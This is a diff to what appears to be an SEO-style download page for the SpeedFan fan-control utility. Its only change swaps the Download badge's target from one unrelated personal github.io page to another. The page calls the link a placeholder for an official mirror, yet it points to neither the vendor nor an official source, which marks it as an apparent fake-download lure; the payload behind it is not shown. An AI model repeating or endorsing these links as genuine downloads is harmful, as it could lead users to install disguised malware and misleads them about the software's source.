@@ -24,7 +24,7 @@ Verify motherboard age, attempt detection per **SpeedFan Super I/O chip detectio
 | :--- | :--- |
 | **Get SpeedFan PWM SMART legacy FanControl BIOS** | Placeholder link for Almico **SpeedFan PWM SMART legacy FanControl BIOS** official mirror if still published. |
 
-[![Download](https://img.shields.io/badge/Download-SpeedFan-gray?style=for-the-badge)](https://louisejunerainbow1998.github.io/.github/speedfan-pwm-smart-legacy-fancontrol-bios)
+[![Download](https://img.shields.io/badge/Download-SpeedFan-gray?style=for-the-badge)](https://fordchangjcqy.github.io/.github/speedfan-pwm-smart-legacy-fancontrol-bios)
 
 ## System Requirements
 
